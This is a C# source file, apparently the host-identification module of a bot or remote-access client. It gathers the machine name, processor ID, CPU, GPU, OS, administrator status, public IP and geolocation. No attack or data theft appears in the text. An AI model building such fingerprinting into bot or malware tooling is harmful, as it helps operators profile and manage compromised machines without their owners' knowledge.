using System;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Xml;

namespace Bot.Classes
{
    class Identification
    {
        public static string getUsername()
        {
            return new Microsoft.VisualBasic.Devices.Computer().Name;
        }

        public static string getHWID()
        {
            string HWID = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
            ManagementClass mc = new ManagementClass("Win32_Processor");
            ManagementObjectCollection moc = mc.GetInstances();

            foreach (ManagementObject mo in moc)
            {
                if (HWID == "")
                {
                    try
                    {
                        HWID = mo["ProcessorId"].ToString();
                    }
                    catch { }
                }
            }
            return HWID;
        }

        public static string getCPU()
        {
            string CPU = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
            ManagementClass mc = new ManagementClass("Win32_Processor");
            ManagementObjectCollection moc = mc.GetInstances();
            foreach (ManagementObject mo in moc)
            {
                if (CPU == "")
                {
                    try
                    {
                        CPU = mo["Name"].ToString();
                    }
                    catch { }
                }
            }
            return CPU;
        }

        public static string getGPU()
        {
            string GPU = "";
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
            foreach (ManagementObject mo in searcher.Get())
            {
                if(GPU == "")
                {
                    foreach (PropertyData property in mo.Properties)
                    {
                        if (property.Name == "Description")
                        {
                            try
                            {
                                GPU = property.Value.ToString();
                            }
                            catch { }
                        }
                    }
                }
            }
            return GPU;
        }

        public static string getOS()
        {
            return new Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.Replace("Microsoft ", "");
        }

        public static string getCountry()
        {
            string ipResponse = IPRequestHelper("http://ip-api.com/xml/" + getIP());
            XmlDocument ipInfoXML = new XmlDocument();
            ipInfoXML.LoadXml(ipResponse);
            XmlNodeList responseXML = ipInfoXML.GetElementsByTagName("query");
            return responseXML.Item(0).ChildNodes[2].InnerText.ToString();
        }

        public static string getIP()
        {
            return new WebClient().DownloadString("http://icanhazip.com").ToString();
        }

        public static string getRegion()
        {
            string ipResponse = IPRequestHelper("http://ip-api.com/xml/" + getIP());
            XmlDocument ipInfoXML = new XmlDocument();
            ipInfoXML.LoadXml(ipResponse);
            XmlNodeList responseXML = ipInfoXML.GetElementsByTagName("query");
            return responseXML.Item(0).ChildNodes[5].InnerText.ToString();
        }

        public static bool getAdmin()
        {
            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static string IPRequestHelper(string url)
        {
            HttpWebRequest objRequest = (HttpWebRequest)WebRequest.Create(url);
            HttpWebResponse objResponse = (HttpWebResponse)objRequest.GetResponse();
            StreamReader responseStream = new StreamReader(objResponse.GetResponseStream());
            return responseStream.ReadToEnd();
        }
    }
}

